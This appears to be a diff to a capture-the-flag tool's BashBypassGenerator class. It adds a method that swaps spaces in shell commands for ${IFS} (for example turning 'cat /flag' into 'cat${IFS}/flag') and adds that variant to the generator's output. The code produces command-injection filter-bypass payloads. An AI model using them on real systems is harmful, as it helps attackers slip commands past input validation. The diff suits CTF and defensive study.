@@ -1334,7 +1334,7 @@ class BashBypassGenerator:
     'cat /flag' -> 'cat$IFS$9/flag'
     """
 
-    def blank_to_ifs(self, payload: str) -> str:
+    def blank_to_ifs_index(self, payload: str) -> str:
         """
         ' ' -> $IFS$9
         """
@@ -1343,6 +1343,14 @@ class BashBypassGenerator:
     # the below are modified from program bashfuck
     # https://github.com/ProbiusOfficial/bashFuck
     # Copyright @ ProbiusOfficial, 2025
+    
+    def black_to_ifs_blanket(self, payload: str) -> str:
+        """
+        'cat /flag' -> 'cat${IFS}/flag'
+        """
+        return payload.replace(" ", "${IFS}")
+    
+    
 
     def get_oct(
         self, c
@@ -1423,7 +1431,8 @@ class BashBypassGenerator:
         yield cmd
         # yield self.interactive(cmd)
         yield self.nomal_otc(cmd)
-        yield self.blank_to_ifs(cmd)
+        yield self.blank_to_ifs_index(cmd)
+        yield self.black_to_ifs_blanket(cmd)
         yield self.common_otc(cmd)
         # yield self.bashfuck_x(cmd, 'bit')
         # yield self.bashfuck_x(cmd, 'zero')
